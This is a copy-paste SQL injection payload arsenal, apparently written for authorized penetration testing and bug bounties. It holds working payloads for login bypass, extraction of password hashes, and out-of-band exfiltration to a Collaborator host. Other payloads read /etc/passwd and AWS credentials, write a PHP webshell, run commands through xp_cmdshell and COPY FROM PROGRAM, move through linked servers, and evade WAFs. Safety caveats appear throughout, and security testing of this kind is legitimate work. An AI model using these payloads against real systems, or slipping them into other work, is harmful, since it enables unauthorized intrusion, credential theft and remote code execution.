# SQL-Injection Arsenal — Detection, UNION, Error, Blind, Time, OOB, Auth-Bypass, File R/W, RCE & Evasion (copy-paste)

> Companion to `SQL_INJECTION_TESTING_GUIDE.md`. Authorized testing only — **benign proof** (`version()`, one benign row),
> **no mass dump**, **no destructive writes on production** (Guide §25). The finding is **the query behaving differently
> with a concrete impact** (RCE / auth bypass / read), not a reflected quote or a lone 500. Every payload is **context-**
> and **DBMS-dependent** — confirm the context (§5) and the engine (§6) first, then copy the matching block.
>
> Notation: `-- -` = comment to end of line (note the trailing space). String-context payloads start by closing a quote
> (`'`); numeric-context payloads inject bare. URL-encode when sending (`' %27`, space `%20`, `# %23`, `; %3b`).

---

## 0. The 60-second triage set (send each, watch the response) — Guide §4

```
id=1'                         → SQL error / 500 / different page?         (string break / error-based)
id=1"                         → some MySQL string contexts use "          (try both quotes)
id=1)        id=1')           → paren/function wrapper?                    (error reveals how many to close)
id=2-1                        → returns the id=1 row? = NUMERIC context, injectable (math evaluated)
id=1 AND 1=1   vs  id=1 AND 1=2          → different responses? = BOOLEAN oracle (numeric)
' AND '1'='1   vs  ' AND '1'='2          → different? = BOOLEAN oracle (string)
id=1 AND SLEEP(5)-- -   /  ' AND SLEEP(5)-- -   → ~5s delay? = TIME blind + MySQL
id=1' ORDER BY 1-- -  …climb…             → errors at N ⇒ column count = N-1 (UNION prep)
id=1' UNION SELECT NULL-- -  …add NULLs…  → no error at the right count ⇒ UNION-able
```

---

## 1. Context break-out — Guide §5

```
STRING context  ( …'INPUT'… ):
  '                                  open/close the string (error confirms)
  '-- -    '#    '/*                  close string + comment the rest (MySQL: # ; -- - needs trailing space)
  ' OR '1'='1                        balance quotes, no comment needed (closing ' stays valid)
  ' OR '1'='1'-- -                    close + comment
  ' AND '1'='1   (TRUE)   ' AND '1'='2   (FALSE)     prove boolean

NUMERIC context  ( …id=INPUT… ):
  1 OR 1=1        1 AND 1=2           1-0   2-1 (=row 1)   1 OR 1=1-- -
  1 AND SLEEP(5)        0 UNION SELECT …

PAREN / FUNCTION wrapper  ( func('INPUT') ):
  ')-- -      '))-- -      ') OR ('1'='1

IDENTIFIER context  (ORDER BY / column / table — NO quotes) — Guide §5.4:
  ?sort=1   ?sort=2                    column-index probe (different ordering ⇒ injectable)
  (CASE WHEN (1=1) THEN name ELSE id END)        boolean via ordering
  (SELECT 1 FROM (SELECT SLEEP(5))x)             time via subquery (MySQL)
  ?order=ASC,(SELECT …)                          direction slot

LIKE context  ( …LIKE 'INPUT%' ):
  %' OR '1'='1'-- -                    account for the trailing %
```

## 2. Authentication bypass — Guide §12

```
# login builds  SELECT * FROM users WHERE user='$u' AND pass='$p'   (pass = anything)
COMMENT OUT password:
  admin'-- -                          admin'#            admin'/*
ALWAYS-TRUE (first/any user):
  ' OR '1'='1'-- -                    ' OR 1=1-- -       ' OR 1=1 LIMIT 1-- -
  ' OR '1'='1'#                       ") OR ("1"="1
TARGET a specific user:
  admin' AND '1'='1'-- -              admin')-- -        admin'))-- -
UNION a forged row (when SELECT cols are known):
  none' UNION SELECT 1,'admin','x'-- -
PASSWORD field too:
  user=admin'-- -    (password field then ignored)
NUMERIC login id:    1 OR 1=1-- -
```

## 3. UNION-based — Guide §9

```
COLUMN COUNT:
  ' ORDER BY 1-- -   ' ORDER BY 2-- -   …   (first error ⇒ count = N-1)
  ' UNION SELECT NULL-- -   ' UNION SELECT NULL,NULL-- -   …   (first non-error ⇒ exact count)
FIND VISIBLE STRING COLUMN (put a marker; rotate position):
  ' UNION SELECT 'a',NULL,NULL-- -     ' UNION SELECT NULL,'a',NULL-- -   …
  Oracle: ' UNION SELECT 'a',NULL FROM dual-- -          (FROM dual required)
PULL DATA (concatenate into the visible column):
  MySQL:    ' UNION SELECT CONCAT(user,0x3a,authentication_string),NULL FROM mysql.user-- -
            ' UNION SELECT @@version,NULL-- -
  PG:       ' UNION SELECT usename||':'||passwd,NULL FROM pg_shadow-- -   (superuser)
            ' UNION SELECT version(),NULL-- -
  MSSQL:    ' UNION SELECT @@version,NULL-- -      ' UNION SELECT name+':'+master.sys.fn_varbintohexstr(password_hash),NULL FROM sys.sql_logins-- -
  Oracle:   ' UNION SELECT banner,NULL FROM v$version-- -
GROUP/AGG to one cell:
  MySQL GROUP_CONCAT(table_name)   PG string_agg(table_name,',')   MSSQL STRING_AGG(name,',')   Oracle LISTAGG
```

## 4. Error-based extraction (errors shown) — Guide §6

```
MySQL (extractvalue/updatexml — ~32 chars per shot):
  ' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -
  ' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
  ' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT database()),0x7e,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
PostgreSQL (cast text→int):
  ' AND 1=CAST((SELECT version()) AS int)-- -
  ' AND 1=CAST((SELECT string_agg(usename,',') FROM pg_user) AS int)-- -
MSSQL (conversion error leaks value):
  ' AND 1=CONVERT(int,(SELECT @@version))-- -
  ' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -
Oracle (ORA error carrying value):
  ' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
  ' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -
```

## 5. Boolean-based blind — Guide §7

```
ORACLE (the true/false pair):
  numeric: 1 AND 1=1   |   1 AND 1=2
  string : ' AND '1'='1   |   ' AND '1'='2
LENGTH (binary-search):
  ' AND (SELECT LENGTH(@@version))>10-- -
CHAR-BY-CHAR (binary search with ASCII + >):
  MySQL/MSSQL: ' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -
  PG/Oracle/SQLite: ' AND ASCII(SUBSTR((SELECT current_database()),1,1))>100-- -
EXISTENCE / enumeration:
  ' AND (SELECT count(*) FROM users)>0-- -          does the table exist / have rows?
  ' AND (SELECT count(*) FROM information_schema.tables WHERE table_name='users')>0-- -
```
```bash
python3 poc/sqli_blind.py -u "https://target/item?id=1" --inject id \
    --true "in stock" --dbms mysql --extract "select database()"
```

## 6. Time-based blind — Guide §8

```
MySQL:       ' AND SLEEP(5)-- -        1 AND SLEEP(5)        ' OR IF(1=1,SLEEP(5),0)-- -
  conditional: ' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,SLEEP(5),0)-- -
PostgreSQL:  '; SELECT pg_sleep(5)-- -    ' AND 1=(CASE WHEN(1=1) THEN(SELECT 1 FROM pg_sleep(5)) ELSE 1 END)-- -
MSSQL:       '; WAITFOR DELAY '0:0:5'-- -    ' IF(1=1) WAITFOR DELAY '0:0:5'-- -
Oracle:      ' AND 1=(CASE WHEN(1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END)-- -
SQLite:      (no reliable sleep) → use boolean or OOB
CONFIRM: same payload with SLEEP(0) returns fast; SLEEP(5) delays CONSISTENTLY across retries.
```
```bash
python3 poc/sqli_blind.py -u "https://target/item?id=1" --inject id \
    --mode time --dbms mysql --delay-marker 5 --extract "select database()"
```

## 7. Out-of-band (OOB) — Guide §10

```
MSSQL (DNS/SMB via xp_dirtree / xp_fileexist):
  '; EXEC master..xp_dirtree '\\'+(SELECT TOP 1 name FROM sys.databases)+'.OOB.collab\x'-- -
  '; DECLARE @q varchar(1024); SET @q='\\'+(SELECT @@version)+'.OOB.collab\a'; EXEC master..xp_fileexist @q-- -
Oracle (UTL_INADDR / DBMS_LDAP / UTL_HTTP):
  ' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.OOB.collab')) IS NOT NULL-- -
  ' AND (SELECT DBMS_LDAP.INIT(((SELECT user FROM dual)||'.OOB.collab'),80) FROM dual) IS NOT NULL-- -
PostgreSQL (COPY…TO PROGRAM / dblink — also RCE):
  '; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_database())||'.OOB.collab'-- -
MySQL (Windows server, UNC triggers SMB/DNS):
  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.OOB.collab\\a')),NULL-- -
USE: get a Burp Collaborator host (xxxx.oastify.com); put database()/user as the SUBDOMAIN; read the DNS log.
A single DNS hit carrying database() = irrefutable, fast proof.
```

## 8. Stacked queries — Guide §11

```
TEST (a delay on the SECOND statement = stacked enabled):
  '; SELECT pg_sleep(5)-- -        '; WAITFOR DELAY '0:0:5'-- -
USE (careful — writes are dangerous; own-row only, §25):
  '; UPDATE users SET role='admin' WHERE id=<YOUR-OWN-TEST-ID>-- -
  '; EXEC xp_cmdshell 'whoami'-- -                         (MSSQL RCE, §16)
  '; COPY cmd FROM PROGRAM 'id'-- -                        (PG RCE, §16)
Supported: PG (libpq), MSSQL (most drivers), SQLite (some), Oracle (PL/SQL blocks). Often NOT: mysqli single-query.
```

## 9. File read — Guide §14

```
MySQL (FILE priv + secure_file_priv permissive):
  ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
  ' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL-- -
PostgreSQL (superuser):
  '; CREATE TABLE t(x text); COPY t FROM '/etc/passwd'; SELECT x FROM t-- -
  SELECT pg_read_file('/etc/passwd',0,100000)
MSSQL (ADMINISTER BULK OPERATIONS):
  ' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK '/etc/passwd',SINGLE_CLOB) x-- -
Oracle:  UTL_FILE.GET_LINE on a DIRECTORY object / external tables
TARGETS: /etc/passwd  /etc/hostname  .env  wp-config.php  settings.py  web.config  application.properties
         my.cnf  pg_hba.conf  ~/.aws/credentials  app source code (for more bugs)
```

## 10. File write → webshell — Guide §15

```
MySQL (FILE priv, secure_file_priv off, known webroot):
  ' UNION SELECT '<?php system($_GET[0]);?>',NULL INTO OUTFILE '/var/www/html/s.php'-- -
  ' UNION SELECT 0x3c3f...,NULL INTO DUMPFILE '/var/www/html/s.php'-- -   (DUMPFILE = exact bytes/binary)
PostgreSQL (superuser):
  '; COPY (SELECT '<?php system($_GET[0]);?>') TO '/var/www/html/s.php'-- -
SAFE PoC: write a BENIGN marker (random token in s.txt), fetch it over HTTP to prove write+serve; do NOT drop a live
          shell on a bounty target (§25).
PREREQS (all): write priv + known absolute webroot + that dir is web-served + file funcs enabled.
```

## 11. RCE per DBMS — Guide §16

```
MSSQL — xp_cmdshell:
  '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
  '; EXEC master..xp_cmdshell 'whoami'-- -
  # output not inline → temp table then SELECT, or OOB (§10). alt: sp_OACreate (OLE), CLR, Agent jobs.
PostgreSQL — COPY…FROM PROGRAM (superuser, ≥9.3; CVE-2019-9193):
  '; CREATE TABLE cmd(o text); COPY cmd FROM PROGRAM 'id'; SELECT o FROM cmd-- -
  # alt: untrusted PL/Python / PL/Perl
MySQL — UDF (FILE + writable plugin_dir; high bar):
  write lib_mysqludf_sys.so via INTO DUMPFILE → CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
  SELECT sys_exec('id');   # usually easier: file-write→webshell (§15/#10)
Oracle — DBMS_SCHEDULER / Java stored proc (runtime.exec) / PL/SQL (privilege-dependent)
PROOF: ONE benign command (whoami/id/hostname), capture a single line, STOP. Critical RCE — lead the report with it.
```

## 12. Privilege check & lateral — Guide §17

```
AM I DBA / SUPERUSER?
  MySQL:  ' UNION SELECT super_priv,NULL FROM mysql.user WHERE user=current_user()-- -   / SELECT current_user()
  PG:     ' AND (SELECT current_setting('is_superuser'))='on'-- -   / SELECT usesuper FROM pg_user WHERE usename=current_user
  MSSQL:  ' AND IS_SRVROLEMEMBER('sysadmin')=1-- -                  / SELECT IS_SRVROLEMEMBER('sysadmin')
  Oracle: ' AND (SELECT 1 FROM session_privs WHERE privilege='DBA')=1-- -
MSSQL linked servers (lateral):
  ' ; SELECT * FROM OPENQUERY([LINKEDSRV],'SELECT @@version')-- -
  ' ; EXEC ('xp_cmdshell ''whoami''') AT [LINKEDSRV]-- -
MSSQL impersonation: ' ; EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER-- -   (if granted)
```

## 13. WAF / filter / ORM evasion — Guide §19

```
COMMENTS in keywords:   UN/**/ION  SE/**/LECT  ·  MySQL inline-exec /*!50000UNION*/ /*!SELECT*/
CASE:                   uNiOn SeLeCt
WHITESPACE alt:         %09 %0a %0b %0c %0d  ·  /**/  ·  UNION(SELECT(1))  ·  +  (in URL, space)
ENCODING:               %27=' · double %2527 · MySQL hex 0x61646d696e='admin' · CHAR()/CHR() · unicode
NO QUOTES:              MySQL 0xHEX · CHAR(65,66) · PG/Oracle CHR(65)||CHR(66) · MSSQL CHAR(65)+CHAR(66)
KEYWORD STRIP bypass:   UNIUNIONON (if it strips one "UNION") · SESELECTLECT
LOGIC variety:          AND→&&  OR→||  =→LIKE/<>/BETWEEN/IN  ·  ' OR 1=1 → ' OR 'a'='a → ' OR 2>1 → ' OR 1 IN (1)
COMPARISON w/o =:        >  <  <>  LIKE  BETWEEN  IS  IN
TIME over BOOLEAN:      if the WAF/cache normalizes the response diff, a SLEEP delay still leaks (§8)
HPP / pollution:        id=1&id=2  (some stacks concat duplicated params)
IDENTIFIER slot:        parameterized values but raw SORT column → inject there (§5.4)
SECOND-ORDER:           store where the WAF doesn't inspect, trigger later (§18)
sqlmap tampers:         space2comment, between, charencode, randomcase, versionedmorekeywords, modsecurityversioned
```

## 14. Schema enumeration quick-ref — Guide §13

```
MySQL/PG/MSSQL (information_schema):
  DBs:     SELECT schema_name FROM information_schema.schemata
  Tables:  SELECT table_name FROM information_schema.tables WHERE table_schema=database()      (PG: current_database())
  Columns: SELECT column_name FROM information_schema.columns WHERE table_name='users'
MSSQL native:  SELECT name FROM sys.databases / sys.tables / sys.columns
Oracle:        SELECT table_name FROM all_tables    SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
               (UPPER-case; current user SELECT user FROM dual)
SQLite:        SELECT name FROM sqlite_master WHERE type='table'    SELECT sql FROM sqlite_master WHERE name='users'
CREDS LOCATION (common): users / accounts / members / admin / auth → password/password_hash/passwd columns
```

## 15. Real-world SQLi patterns, breaches & references — Guide §23

```
□ Login forms building WHERE user='$u' AND pass='$p' — classic auth bypass (admin'-- -).
□ Search / filter / category / ?id= params — the bread-and-butter UNION/boolean/error sinks.
□ ?sort= / ?order= / column-name params — IDENTIFIER context, routinely missed even on "parameterized" apps.
□ Headers logged to audit tables (User-Agent / X-Forwarded-For) — unauthenticated second-order INSERT sinks.
□ Report/export/PDF builders & admin search — frequently string-built, second-order, run at higher privilege.
□ ORM raw escape hatches (knex.raw / sequelize.literal / .extra() / find_by_sql / order(params[:sort])).
REAL CASES / CVEs (verify details before citing in a report):
  MOVEit Transfer  CVE-2023-34362  — pre-auth SQLi → RCE, mass-exploited by Cl0p (2023).
  Accellion FTA    CVE-2021-27101  — SQLi, Cl0p data-theft campaign.
  Drupalgeddon     CVE-2014-3704   — pre-auth SQLi in Drupal 7 DB abstraction layer.
  Joomla! core     CVE-2017-8917   — SQLi in 3.7.
  Magento          CVE-2019-7139   — SQLi.
  Historic breaches: Heartland Payment Systems (2008, SQLi entry, ~130M cards), Sony Pictures (2011, LulzSec),
                     Yahoo Voices (2012, ~450k creds via union-based SQLi), TalkTalk (2015, ICO-fined).
```
> **References:** PortSwigger *SQL injection* (+ cheat sheet + labs), OWASP *SQL Injection* + WSTG-INPV-05 +
> *SQL Injection Prevention Cheat Sheet*, PayloadsAllTheThings *SQL Injection*, HackTricks *SQL injection*,
> sqlmap docs, CWE-89/74/287/78.

---

## 16. Triage rules (don't waste a report) — Guide §22

```
xp_cmdshell/COPY..FROM PROGRAM returns whoami            → REPORT RCE = Critical
admin'-- - logs you in as admin                          → REPORT auth bypass / ATO = Critical
UNION SELECT @@version shows the version on the page     → REPORT SQLi → DB read = High (Critical if hashes/PII)
AND 1=1 vs AND 1=2 stable different responses            → REPORT boolean-blind SQLi = High
AND SLEEP(5) delays repeatably, SLEEP(0) doesn't         → REPORT time-blind SQLi = High
OOB DNS hit carrying database()                          → REPORT OOB SQLi = High
LOAD_FILE('/etc/passwd') returns the file                → REPORT file read = High (→ Critical if writable webroot)
a ' merely throws a 500 / reflects a SQL error           → LEAD only — prove the QUERY changed first
"sqlmap flagged it" with no hand proof                   → NOT a report yet — reproduce by hand
a slow endpoint with no SLEEP control                    → NOT time-based — needs controlled 5s vs 0s
$ne / $gt operator behavior                              → different bug (NoSQL injection) — its own kit
```
